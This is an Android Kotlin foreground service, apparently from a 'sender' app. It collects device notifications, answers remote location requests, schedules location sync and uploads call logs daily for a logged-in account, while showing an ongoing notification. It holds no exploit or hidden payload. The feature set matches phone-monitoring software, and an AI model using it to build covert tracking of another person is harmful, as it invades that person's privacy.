// ============================================================
// FILE: app/src/main/java/com/app/notisync_sender/service/SyncForegroundService.kt
// Purpose: Persistent foreground service that keeps the app alive
// and coordinates notification sync components
// ============================================================

package com.app.notisync_sender.service

import android.app.Notification
import android.app.PendingIntent
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import com.app.notisync_sender.MainActivity
import com.app.notisync_sender.NotiSyncSenderApp
import com.app.notisync_sender.R
import com.app.notisync_sender.data.repository.AuthRepository
import com.app.notisync_sender.data.repository.NotificationRepository
import com.app.notisync_sender.domain.model.DeviceInfo
import com.app.notisync_sender.domain.processor.BatchProcessor
import com.app.notisync_sender.service.location.LocationRequestObserver
import com.app.notisync_sender.service.location.LocationRequestWorker
import com.app.notisync_sender.service.location.LocationSyncWorker
import com.app.notisync_sender.service.calllog.CallLogSyncWorker
import com.app.notisync_sender.service.calllog.CallLogRetryWorker
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class SyncForegroundService : LifecycleService() {

    companion object {
        private const val TAG = "SyncForegroundService"
    }

    @Inject
    lateinit var batchProcessor: BatchProcessor

    @Inject
    lateinit var notificationRepository: NotificationRepository

    @Inject
    lateinit var authRepository: AuthRepository

    @Inject
    lateinit var deviceInfo: DeviceInfo

    @Inject
    lateinit var locationRequestObserver: LocationRequestObserver

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        startForegroundWithNotification()
        initializeSyncComponents()

        return START_STICKY
    }

    private fun startForegroundWithNotification() {
        val notification = buildNotification()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Updated to include LOCATION type for background access
            startForeground(
                NotiSyncSenderApp.SYNC_NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            )
        } else {
            startForeground(NotiSyncSenderApp.SYNC_NOTIFICATION_ID, notification)
        }

        Log.d(TAG, "Foreground service started with dataSync|location types")
    }

    private fun buildNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, NotiSyncSenderApp.SYNC_CHANNEL_ID)
            .setContentTitle("Notification Sync Active")
            .setContentText("Listening for notifications & events...")
            .setSmallIcon(R.drawable.ic_sync)
            .setOngoing(true)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()
    }

    private fun initializeSyncComponents() {
        val userId = authRepository.getCurrentUserId()

        if (userId == null) {
            Log.e(TAG, "No user logged in — stopping service")
            stopSelf()
            return
        }

        batchProcessor.configure(userId, deviceInfo)
        batchProcessor.startBatchTimer()
        notificationRepository.startCollecting()

        startLocationServices()
        startCallLogServices()

        lifecycleScope.launch {
            notificationRepository.registerDevice(userId, deviceInfo)
        }

        Log.d(TAG, "Sync components initialized for user: $userId")
    }

    private fun startLocationServices() {
        locationRequestObserver.startObserving()
        Log.d(TAG, "Location request observer started")

        LocationRequestWorker.schedule(this)
        Log.d(TAG, "Location request worker scheduled")

        lifecycleScope.launch {
            try {
                LocationSyncWorker.scheduleOneTime(this@SyncForegroundService)
            } catch (e: Exception) {
                Log.e(TAG, "Error during initial location check: ${e.message}")
            }
        }
    }

    private fun stopLocationServices() {
        locationRequestObserver.stopObserving()
        Log.d(TAG, "Location request observer stopped")

        LocationRequestWorker.cancel(this)
        Log.d(TAG, "Location request worker cancelled")
    }

    private fun startCallLogServices() {
        CallLogSyncWorker.schedule(this)
        Log.d(TAG, "Call log sync worker scheduled (daily at 11PM)")

        lifecycleScope.launch {
            try {
                CallLogRetryWorker.scheduleOneTime(this@SyncForegroundService)
            } catch (e: Exception) {
                Log.e(TAG, "Error scheduling call log retry: ${e.message}")
            }
        }
    }

    private fun stopCallLogServices() {
        CallLogSyncWorker.cancel(this)
        Log.d(TAG, "Call log sync worker cancelled")
    }

    override fun onDestroy() {
        super.onDestroy()

        batchProcessor.stopBatchTimer()
        notificationRepository.stopCollecting()

        stopLocationServices()
        stopCallLogServices()

        Log.d(TAG, "Service destroyed — sync stopped")
    }

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null
    }
}
